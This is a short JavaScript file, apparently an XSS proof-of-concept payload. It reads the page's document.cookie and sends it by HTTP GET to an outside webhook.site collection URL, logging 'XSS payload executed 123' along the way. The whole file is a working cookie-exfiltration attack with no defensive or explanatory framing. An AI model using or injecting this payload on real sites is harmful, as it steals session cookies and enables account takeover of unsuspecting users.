let x = document.cookie; 

function httpGet(theUrl)
{
    let x = document.cookie; 
    console.log('Cookie: '+x);
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", theUrl+'x?'+x, false ); // false for synchronous request
    xmlHttp.send( null );
    return xmlHttp.responseText;
}

console.log('XSS payload executed 123');
httpGet('https://webhook.site/604e583c-9a9d-4180-9017-fecddc65252b/');
